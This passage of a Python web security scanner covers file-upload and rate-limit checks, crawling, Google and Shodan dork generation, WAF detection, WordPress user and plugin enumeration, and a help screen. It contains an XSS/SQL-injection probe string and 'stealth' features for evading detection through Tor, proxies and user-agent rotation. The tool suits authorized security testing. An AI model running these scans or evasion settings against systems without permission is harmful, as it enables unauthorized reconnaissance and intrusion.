    # =========================================================================

    def op_file_upload(self) -> Dict:
        """Detect file upload endpoints and forms."""
        section("FILE UPLOAD DETECTION")

        results = {"findings": []}

        resp = self._request(self.url)
        if resp:
            body = resp["body"]
            upload_forms = re.findall(
                r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>',
                body, re.IGNORECASE
            )
            if upload_forms:
                warn(f"Found {len(upload_forms)} multipart upload form(s) on main page")
                self._add_finding("upload_endpoint",
                    detail=f"{len(upload_forms)} file upload form(s) detected on main page",
                    evidence="enctype=multipart/form-data")
                results["findings"].append({
                    "type": "upload_form_detected",
                    "count": len(upload_forms),
                    "url": self.url,
                })

        for path in UPLOAD_PATHS:
            r = self._request(self.url + path, timeout=5.0)
            if r and r["status"] in (200, 201, 405):
                warn(f"[{r['status']}] Upload path accessible: {path}")
                self._add_finding("upload_endpoint",
                    detail=f"Upload endpoint {path} returned {r['status']}",
                    evidence=f"HTTP {r['status']} at {self.url + path}",
                    url=self.url + path,
                    severity_override="INFO")
                results["findings"].append({
                    "type": "upload_endpoint",
                    "path": path,
                    "status_code": r["status"],
                    "url": self.url + path,
                })

        if not results["findings"]:
            ok("No upload endpoints detected")

        return results

    # =========================================================================
    # OPERATION: RATE LIMIT CHECK
    # =========================================================================

    def op_rate_limit(self) -> Dict:
        """Check for missing rate limiting."""
        section("RATE LIMIT TESTING")

        attempts = int(self.params.get("rate_limit_attempts", 10))
        test_url = self.test_url or self.url
        results = {"codes": [], "limited": False}

        info(f"Sending {attempts} requests to {test_url}...")

        for i in range(attempts):
            r = self._request(test_url, timeout=5.0)
            if r:
                results["codes"].append(r["status"])
            time.sleep(0.1)

        codes = results["codes"]
        if codes and 429 not in codes and all(c < 400 for c in codes):
            warn(f"No rate limiting detected after {attempts} requests (all {set(codes)})")
            self._add_finding("missing_rate_limit",
                detail=f"No 429 response after {attempts} rapid requests",
                evidence=f"Status codes received: {codes}")
            results["limited"] = False
        elif 429 in codes:
            ok(f"Rate limiting active (received 429)")
            results["limited"] = True
        else:
            info(f"Inconclusive - received codes: {set(codes)}")

        return results

    # =========================================================================
    # OPERATION: WEB SPIDER
    # =========================================================================

    def op_spider(self) -> Dict:
        """Spider/crawl the target website."""
        section("WEB SPIDER / CRAWLER")

        max_pages = int(self.params.get("max_pages", 50))
        visited = set()
        queue = [self.url]
        found = {"urls": [], "forms": [], "js_files": [], "external": []}

        while queue and len(visited) < max_pages:
            url = queue.pop(0)
            if url in visited:
                continue
            visited.add(url)

            resp = self._request(url, timeout=5.0)
            if not resp or resp["status"] != 200:
                continue

            info(f"Crawled: {url} [{resp['status']}] ({len(resp['body'])} bytes)")
            found["urls"].append(url)

            if not CAPS["bs4"]:
                continue

            soup = BeautifulSoup(resp["body"], "html.parser")

            for tag in soup.find_all(["a", "link"], href=True):
                href = tag["href"]
                if href.startswith("#") or href.startswith("mailto:"):
                    continue
                full = urllib.parse.urljoin(url, href)
                parsed = urllib.parse.urlparse(full)
                if parsed.hostname == self.host:
                    if full not in visited and full not in queue:
                        queue.append(full)
                else:
                    if full not in found["external"]:
                        found["external"].append(full)

            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                fields = [inp.get("name", "") for inp in form.find_all(["input", "textarea", "select"])]
                form_data = {"action": urllib.parse.urljoin(url, action),
                             "method": method, "fields": fields, "source_url": url}
                found["forms"].append(form_data)
                info(f"  -> Form: {method} {form_data['action']} | Fields: {fields[:5]}")

            for script in soup.find_all("script", src=True):
                src = script["src"]
                full_src = urllib.parse.urljoin(url, src)
                if full_src not in found["js_files"]:
                    found["js_files"].append(full_src)

        ok(f"Spider complete: {len(found['urls'])} pages, {len(found['forms'])} forms, "
           f"{len(found['js_files'])} JS files, {len(found['external'])} external links")

        return found

    # =========================================================================
    # OPERATION: GOOGLE DORKS
    # =========================================================================

    def op_dork(self) -> Dict:
        """Generate Google dork queries for OSINT."""
        section("GOOGLE DORK GENERATOR")

        domain = self.host
        dorks = {
            "Find login pages": f"site:{domain} inurl:login OR inurl:signin OR inurl:admin",
            "Find exposed files": f"site:{domain} ext:php OR ext:asp OR ext:aspx OR ext:jsp",
            "Find config files": f"site:{domain} ext:env OR ext:conf OR ext:config OR ext:yml OR ext:yaml",
            "Find backup files": f"site:{domain} ext:bak OR ext:backup OR ext:old OR ext:sql",
            "Find error pages": f"site:{domain} intext:\"SQL syntax\" OR intext:\"Warning: mysql\"",
            "Find exposed docs": f"site:{domain} ext:pdf OR ext:doc OR ext:docx OR ext:xls",
            "Find subdomains": f"site:*.{domain} -www",
            "Find cached pages": f"cache:{domain}",
            "Find email addresses": f"site:{domain} \"@{domain}\"",
            "Find directory listings": f"site:{domain} intitle:\"Index of /\"",
            "Find sensitive paths": f"site:{domain} inurl:phpinfo OR inurl:test.php OR inurl:info.php",
            "Wayback Machine": f"https://web.archive.org/web/*/{domain}/*",
            "Shodan": f"https://www.shodan.io/search?query=hostname:{domain}",
            "Hunter.io (emails)": f"https://hunter.io/search/{domain}",
            "AlienVault OTX": f"https://otx.alienvault.com/indicator/domain/{domain}",
            "VirusTotal": f"https://www.virustotal.com/gui/domain/{domain}",
            "SecurityTrails": f"https://securitytrails.com/domain/{domain}/dns",
            "Certificate Search": f"https://crt.sh/?q=%.{domain}",
        }

        for label, dork in dorks.items():
            ok(f"{label}:")
            info(f"  {dork}")

        print(file=sys.stderr)
        info("Shodan-specific dorks (search at shodan.io):")
        shodan_dorks = [
            f'hostname:"{domain}" http.title:"admin"',
            f'hostname:"{domain}" port:8080',
            f'hostname:"{domain}" port:8443',
            f'net:{self.host} port:22',
            f'ssl.cert.subject.cn:"{domain}" 200',
        ]
        for d in shodan_dorks:
            info(f"  {d}")

        return {"dorks": dorks}

    # =========================================================================
    # OPERATION: SSL FULL ANALYSIS
    # =========================================================================

    def op_ssl(self) -> Dict:
        """Full SSL/TLS analysis."""
        section("SSL/TLS DEEP ANALYSIS")

        ssl_result = self._ssl_inspect()
        info(f"For comprehensive TLS testing: https://www.ssllabs.com/ssltest/analyze.html?d={self.host}")

        if self.scheme == "https":
            http_url = f"http://{self.host}:{self.port if self.port != 443 else 80}"
            resp = self._request(http_url, allow_redirects=False, timeout=5.0)
            if resp:
                if resp["status"] in (301, 302, 307, 308):
                    resp_headers_lower = {k.lower(): v for k, v in resp["headers"].items()}
                    location = resp_headers_lower.get("location", "")
                    if "https" in location:
                        ok(f"HTTP -> HTTPS redirect: {resp['status']} to {location[:60]}")
                    else:
                        warn(f"HTTP doesn't redirect to HTTPS: {resp['status']} to {location}")
                        self._add_finding("weak_ssl",
                            detail="HTTP requests are not redirected to HTTPS")
                else:
                    warn(f"HTTP site accessible without redirect: {resp['status']}")
                    self._add_finding("weak_ssl",
                        detail="Site accessible over plain HTTP without HTTPS redirect",
                        evidence=f"HTTP {resp['status']} at {http_url}")

        return ssl_result

    # =========================================================================
    # OPERATION: WAF DETECTION
    # =========================================================================

    def op_waf(self) -> Dict:
        """Detect Web Application Firewall (WAF)."""
        section("WAF DETECTION")

        waf_signatures = {
            "Cloudflare": [r"cloudflare", r"CF-RAY", r"__cfduid", r"Attention Required"],
            "AWS WAF": [r"AWS WAF", r"x-amzn-RequestId"],
            "Akamai": [r"AkamaiGHost", r"akamai"],
            "ModSecurity": [r"ModSecurity", r"mod_security", r"NOYB"],
            "Sucuri": [r"Sucuri", r"sucuri"],
            "Imperva": [r"Imperva", r"incapsula", r"visid_incap"],
            "F5 BIG-IP": [r"BigIP", r"F5", r"TS[a-z0-9]{8,}"],
            "Barracuda": [r"barra_counter_session"],
            "Fortinet": [r"FORTIWAFSID"],
        }

        baseline = self._request(self.url)
        baseline_status = baseline["status"] if baseline else 0

        attack_payload = "/?q=<script>alert(1)</script>&id=1 UNION SELECT 1--"
        attack_resp = self._request(f"{self.url}{attack_payload}")

        detected_waf = []
        waf_active = False

        if attack_resp:
            all_text = str(attack_resp["headers"]) + attack_resp["body"][:2000]

            for waf_name, patterns in waf_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, all_text, re.IGNORECASE):
                        ok(f"WAF Detected: {waf_name}")
                        detected_waf.append(waf_name)
                        waf_active = True
                        break

            if attack_resp["status"] in (403, 406, 429, 503) and not waf_active:
                if attack_resp["status"] != baseline_status:
                    warn(f"Possible WAF: Request blocked with {attack_resp['status']} (baseline was {baseline_status})")
                    waf_active = True
                    detected_waf.append("Unknown WAF")

        if not detected_waf:
            info("No WAF signature detected.")

        return {"detected": detected_waf, "waf_active": waf_active}

    # =========================================================================
    # OPERATION: STEALTH CONFIGURATION & ANONYMIZATION CHECK
    # =========================================================================

    def op_stealth(self) -> Dict:
        """Display current stealth configuration and test anonymization posture."""
        section("STEALTH & ANONYMIZATION")

        result = {
            "stealth_mode": self.stealth,
            "rotate_ua": self.rotate_ua,
            "delay": self.delay,
            "jitter": self.jitter,
            "proxy": self.proxy or None,
            "waf_evasion": self.waf_evasion,
            "current_ua": self.user_agent,
            "proxy_reachable": None,
        }

        # Show current config
        ok("Stealth mode:    " + (f"{G}ON{NC}" if self.stealth else f"{Y}OFF{NC}"))
        ok(f"UA rotation:     {'ON — ' + self.user_agent[:60] if self.rotate_ua else 'OFF'}")
        ok(f"Request delay:   {self.delay}s" + (f" + up to {self.jitter}s jitter" if self.jitter else ""))
        ok(f"Proxy:           {self.proxy or 'none'}")
        ok(f"WAF evasion:     {'ON' if self.waf_evasion else 'OFF'}")

        # Show headers that will be sent
        section("Headers sent per request")
        headers_preview = {"User-Agent": self.user_agent}
        if self.stealth:
            headers_preview.update(BROWSER_HEADERS)
        for k, v in headers_preview.items():
            info(f"  {k}: {v}")

        # Proxy reachability test
        if self.proxy:
            info(f"Testing proxy: {self.proxy}")
            r = self._request(self.url, timeout=8.0)
            if r:
                ok(f"Proxy reachable — target responded {r['status']} via {self.proxy}")
                result["proxy_reachable"] = True
            else:
                bad(f"Proxy unreachable or blocked — {self.proxy}")
                result["proxy_reachable"] = False
        else:
            warn("No proxy configured — your real IP will be in server logs")
            warn("Use: set proxy http://127.0.0.1:8080  (Burp) or socks5://127.0.0.1:9050  (Tor)")

        # Recommendations
        section("Recommendations")
        if not self.stealth:
            warn("Run 'set stealth true' — enables UA rotation + full browser headers")
        if not self.proxy:
            warn("Route through Tor: set proxy socks5://127.0.0.1:9050")
            warn("Or through Burp:   set proxy http://127.0.0.1:8080")
        if not self.delay and not self.jitter:
            warn("Add jitter to avoid rate-based detection: set delay 0.5 / set jitter 1.5")
        if not self.waf_evasion:
            info("Enable WAF evasion payloads for SQLi/XSS: set waf_evasion true")

        if self.stealth and self.proxy and self.delay:
            ok("Full stealth posture configured — proxy + UA rotation + delay active")

        return result

    # =========================================================================
    # OPERATION: WORDPRESS ATTACK SURFACE
    # =========================================================================

    def op_wordpress(self) -> Dict:
        """WordPress-specific attack surface enumeration."""
        section("WORDPRESS ATTACK SURFACE")

        results = {
            "is_wordpress": False,
            "version": None,
            "users": [],
            "plugins": [],
            "xmlrpc": False,
            "findings": [],
        }

        resp = self._request(self.url)
        if not resp:
            bad("Could not reach target")
            return results

        body = resp["body"]
        is_wp = bool(re.search(r"wp-content|wp-includes|wordpress", body, re.IGNORECASE))
        if not is_wp:
            info("WordPress not detected on this target")
            return results

        results["is_wordpress"] = True
        ok("WordPress detected")

        # Version from generator meta tag
        ver_match = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress ([0-9.]+)', body, re.IGNORECASE)
        if ver_match:
            version = ver_match.group(1)
            results["version"] = version
            warn(f"WordPress version: {version}")
            self._add_finding("wp_version_disclosure",
                detail=f"WordPress version {version} disclosed in generator meta tag",
                evidence=f"<meta name='generator' content='WordPress {version}'>",
                url=self.url)

        # User enumeration via REST API
        info("Probing REST API for user enumeration...")
        api_resp = self._request(self.url.rstrip("/") + "/wp-json/wp/v2/users")
        if api_resp and api_resp["status"] == 200:
            try:
                users = json.loads(api_resp["body"])
                if isinstance(users, list) and users:
                    bad(f"User enumeration via REST API: {len(users)} user(s) exposed")
                    for u in users:
                        name = u.get("name", "")
                        slug = u.get("slug", "")
                        uid = u.get("id", "")
                        results["users"].append({"id": uid, "name": name, "slug": slug})
                        bad(f"  User: id={uid} name={name} login={slug}")
                    self._add_finding("wp_user_enum",
                        detail=f"{len(users)} WordPress user(s) enumerated via /wp-json/wp/v2/users",
                        evidence="\n".join(f"id={u.get('id')} login={u.get('slug')}" for u in users[:5]),
                        url=self.url.rstrip("/") + "/wp-json/wp/v2/users",
                        severity_override="HIGH")
                    results["findings"].append("rest_api_user_enum")
            except (json.JSONDecodeError, KeyError):
                pass

        # User enumeration via /?author=N
        info("Probing /?author= redirect for username disclosure...")
        for uid in range(1, 4):
            author_resp = self._request(self.url.rstrip("/") + f"/?author={uid}", allow_redirects=True)
            if author_resp and author_resp["status"] == 200:
                slug_match = re.search(r"/author/([^/\"']+)", author_resp.get("url", "") + author_resp["body"])
                if slug_match:
                    slug = slug_match.group(1)
                    if slug not in [u["slug"] for u in results["users"]]:
                        warn(f"Username via /?author={uid}: {slug}")
                        results["users"].append({"id": uid, "slug": slug})

        # xmlrpc.php detection
        info("Checking xmlrpc.php...")
        xml_resp = self._request(self.url.rstrip("/") + "/xmlrpc.php")
        if xml_resp and xml_resp["status"] in (200, 405):
            results["xmlrpc"] = True
            warn("xmlrpc.php is accessible — enables brute force amplification and SSRF")
            self._add_finding("wp_xmlrpc",
                detail="xmlrpc.php accessible — can be abused for credential brute-force (multicall) and SSRF",
                evidence=f"HTTP {xml_resp['status']} at /xmlrpc.php",
                url=self.url.rstrip("/") + "/xmlrpc.php",
                severity_override="MEDIUM")
            results["findings"].append("xmlrpc_enabled")

        # Plugin enumeration from source
        info("Enumerating plugins from page source...")
        plugin_matches = re.findall(r"/wp-content/plugins/([a-zA-Z0-9_-]+)/", body)
        seen = set()
        for p in plugin_matches:
            if p not in seen:
                seen.add(p)
                results["plugins"].append(p)
                info(f"  Plugin: {p}")

        if results["plugins"]:
            self._add_finding("wp_plugin_enum",
                detail=f"{len(results['plugins'])} plugin(s) enumerated from page source",
                evidence=", ".join(results["plugins"]),
                url=self.url,
                severity_override="INFO")
            results["findings"].append("plugin_enum")

        # wp-login.php accessible
        login_resp = self._request(self.url.rstrip("/") + "/wp-login.php")
        if login_resp and login_resp["status"] == 200:
            warn("wp-login.php exposed — susceptible to brute force")
            self._add_finding("wp_login_exposed",
                detail="wp-login.php is publicly accessible with no lockout indication",
                evidence=f"HTTP 200 at /wp-login.php",
                url=self.url.rstrip("/") + "/wp-login.php",
                severity_override="LOW")
            results["findings"].append("wp_login_exposed")

        # wp-cron.php
        cron_resp = self._request(self.url.rstrip("/") + "/wp-cron.php")
        if cron_resp and cron_resp["status"] == 200:
            warn("wp-cron.php is publicly accessible — can be used for DoS/abuse")
            self._add_finding("wp_cron_exposed",
                detail="wp-cron.php accessible publicly — external requests can trigger scheduled tasks",
                evidence="HTTP 200 at /wp-cron.php",
                url=self.url.rstrip("/") + "/wp-cron.php",
                severity_override="LOW")

        info(f"WordPress enumeration complete: {len(results['users'])} users, {len(results['plugins'])} plugins")
        return results

    # =========================================================================
    # OPERATION: FULL SCAN
    # =========================================================================

    def op_full(self) -> Dict:
        """Run complete security assessment."""
        section("FULL WEB SECURITY ASSESSMENT")

        results = {}
        results["recon"] = self.op_recon()
        results["cookies"] = self.op_cookies()
        results["cors"] = self.op_cors()
        results["dirs"] = self.op_dirs()
        results["waf"] = self.op_waf()
        results["ssl"] = self.op_ssl()
        results["csrf"] = self.op_csrf()
        results["bypass_403"] = self.op_bypass_403()
        results["open_redirect"] = self.op_open_redirect()
        results["framework_cves"] = self.op_framework_cves()
        results["file_upload"] = self.op_file_upload()
        results["rate_limit"] = self.op_rate_limit()
        results["wordpress"] = self.op_wordpress()

        return results

    # =========================================================================
    # EXECUTE
    # =========================================================================

    def execute(self) -> Dict:
        """Main execution dispatcher."""
        print(banner(), file=sys.stderr)
        info(f"Target: {self.url}")
        info(f"Operation: {self.operation.upper()}")
        info(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{DIM}{'─'*60}{NC}", file=sys.stderr)
        print(file=sys.stderr)

        operations = {
            "recon": self.op_recon,
            "headers": self.op_headers,
            "cors": self.op_cors,
            "cookies": self.op_cookies,
            "dirs": self.op_dirs,
            "sqli": self.op_sqli,
            "xss": self.op_xss,
            "spider": self.op_spider,
            "dork": self.op_dork,
            "ssl": self.op_ssl,
            "waf": self.op_waf,
            "full": self.op_full,
            "csrf": self.op_csrf,
            "bypass_403": self.op_bypass_403,
            "open_redirect": self.op_open_redirect,
            "framework_cves": self.op_framework_cves,
            "file_upload": self.op_file_upload,
            "rate_limit": self.op_rate_limit,
            "wordpress": self.op_wordpress,
            "stealth": self.op_stealth,
        }

        func = operations.get(self.operation, self.op_recon)

        try:
            op_result = func()
        except Exception as e:
            self.errors.append(str(e))
            op_result = {}

        # Print findings summary
        if self.findings:
            section("FINDINGS SUMMARY")
            severity_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
            sorted_findings = sorted(self.findings,
                key=lambda f: severity_order.index(f.get("severity", "INFO"))
                if f.get("severity", "INFO") in severity_order else 99)

            for i, f in enumerate(sorted_findings, 1):
                sev = f.get("severity", "INFO")
                color = self._severity_color(sev)
                print(f"\n{color}{BOLD}[{sev}] {i}. {f['name']}{NC}", file=sys.stderr)
                print(f"  {f.get('description', '')}", file=sys.stderr)
                if f.get("fix"):
                    print(f"  {G}FIX: {f['fix']}{NC}", file=sys.stderr)

            counts = {}
            for f in sorted_findings:
                s = f.get("severity", "INFO")
                counts[s] = counts.get(s, 0) + 1

            print(f"\n{BOLD}Total: {len(sorted_findings)} findings{NC}", file=sys.stderr)
            for sev, count in counts.items():
                color = self._severity_color(sev)
                print(f"  {color}{sev}: {count}{NC}", file=sys.stderr)
        else:
            ok("No critical findings detected in this run")

        return {
            "success": True,
            "data": {
                "target": self.url,
                "host": self.host,
                "operation": self.operation,
                "timestamp": datetime.now().isoformat(),
                "result": op_result,
                "findings": self.findings,
                "finding_count": {
                    "critical": sum(1 for f in self.findings if f.get("severity") == "CRITICAL"),
                    "high": sum(1 for f in self.findings if f.get("severity") == "HIGH"),
                    "medium": sum(1 for f in self.findings if f.get("severity") == "MEDIUM"),
                    "low": sum(1 for f in self.findings if f.get("severity") == "LOW"),
                    "info": sum(1 for f in self.findings if f.get("severity") == "INFO"),
                }
            },
            "errors": self.errors,
        }

# ============================================================================
# MAIN
# ============================================================================

def _print_summary(result: dict):
    """Print a clean formatted summary to stderr."""
    data = result.get("data", {})
    fc = data.get("finding_count", {})

    parts = []
    if fc.get("critical"):
        parts.append(f"{R}{BOLD}{fc['critical']} critical{NC}")
    if fc.get("high"):
        parts.append(f"{R}{fc['high']} high{NC}")
    if fc.get("medium"):
        parts.append(f"{Y}{fc['medium']} medium{NC}")
    if fc.get("low"):
        parts.append(f"{C}{fc['low']} low{NC}")
    if fc.get("info"):
        parts.append(f"{B}{fc['info']} info{NC}")

    findings_str = "  ".join(parts) if parts else f"{G}none{NC}"

    line = "─" * 54
    print(f"\n{BOLD}{W}┌─ RESULTS {line}{NC}", file=sys.stderr)
    print(f"{W}│{NC}  target     {C}{data.get('target', '')}{NC}", file=sys.stderr)
    print(f"{W}│{NC}  operation  {data.get('operation', '')}", file=sys.stderr)
    print(f"{W}│{NC}  findings   {findings_str}", file=sys.stderr)
    print(f"{BOLD}{W}└{line}─{NC}\n", file=sys.stderr)


def main():
    if len(sys.argv) > 1 and sys.argv[1] in ("--help", "-h", "help"):
        print(banner())
        print(f"""
{BOLD}{Y}OPERATIONS:{NC}

  {G}recon{NC}          Full web OSINT (DNS, WHOIS, SSL, robots, headers, tech stack)
  {G}headers{NC}        HTTP security headers audit
  {G}cors{NC}           CORS misconfiguration testing
  {G}cookies{NC}        Cookie security flag audit
  {G}dirs{NC}           Directory and sensitive file discovery
  {G}sqli{NC}           SQL injection (error-based + time-based blind)
  {G}xss{NC}            Reflected XSS detection
  {G}csrf{NC}           CSRF token detection
  {G}bypass_403{NC}     403 bypass via headers and path tricks
  {G}open_redirect{NC}  Open redirect testing
  {G}framework_cves{NC} Jira/AEM/Confluence CVE path probes
  {G}file_upload{NC}    File upload endpoint detection
  {G}rate_limit{NC}     Rate limiting check
  {G}spider{NC}         Web crawler / site mapper
  {G}dork{NC}           Google dork generator
  {G}ssl{NC}            SSL/TLS deep analysis
  {G}waf{NC}            WAF detection
  {G}wordpress{NC}      WordPress attack surface (users, plugins, xmlrpc, wp-cron)
  {G}stealth{NC}        Show/test stealth config: proxy, UA rotation, delay, WAF evasion
  {G}full{NC}           Complete assessment (all operations)

{BOLD}{Y}STEALTH PARAMETERS:{NC}
  stealth               Enable stealth mode: UA rotation + browser headers (true/false)
  rotate_ua             Rotate User-Agent on every request (true/false)
  delay                 Fixed delay between requests in seconds (e.g. 0.5)
  jitter                Add 0-N seconds of random jitter to delay (e.g. 1.5)
  proxy                 Route traffic through proxy (http://host:port or socks5://host:port)
  waf_evasion           Use obfuscated SQLi/XSS payloads to bypass WAFs (true/false)

{BOLD}{Y}PARAMETERS:{NC}
  operation             Operation to run (see above)
  test_url              URL with parameters for sqli/xss/redirect testing
  bypass_path           Path to test for 403 bypass (default: /admin)
  cookies               Cookie string (key=val; key2=val2)
  headers_str           Extra headers (Key: Value; Key2: Value2)
  user_agent            Custom User-Agent string
  threads               Concurrent threads for discovery (default: 10)
  timeout               Request timeout in seconds (default: 10)
  max_pages             Max pages for spider (default: 50)
  wordlist_file         Path to custom wordlist for dirs operation
  rate_limit_attempts   Number of requests for rate limit test (default: 10)
  verbose               Show verbose output (true/false)

{BOLD}{R}LEGAL DISCLAIMER:{NC}
  Only test systems you own or have explicit written authorization to test.
  Unauthorized testing is illegal under the CFAA, Computer Misuse Act, and similar laws.
""")
        sys.exit(0)

    try:
        raw = sys.stdin.read()
        context = json.loads(raw)
    except Exception as e:
        print(json.dumps({
            "success": False,
            "errors": [f"Invalid JSON input: {e}. Send via SecV: run <target>"]
        }))
        sys.exit(1)

    target = context.get("target", "")
    params = context.get("params", {})

    if not target:
        print(json.dumps({"success": False, "errors": ["No target specified"]}))
        sys.exit(1)

    tool = WebSec(target, params)

    try:
        result = tool.execute()
        _print_summary(result)
        print(json.dumps(result, indent=2, default=str))
    except KeyboardInterrupt:
        print(json.dumps({"success": False, "errors": ["Interrupted by user"]}))
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"success": False, "errors": [str(e)]}))
        sys.exit(1)


if __name__ == "__main__":
    main()
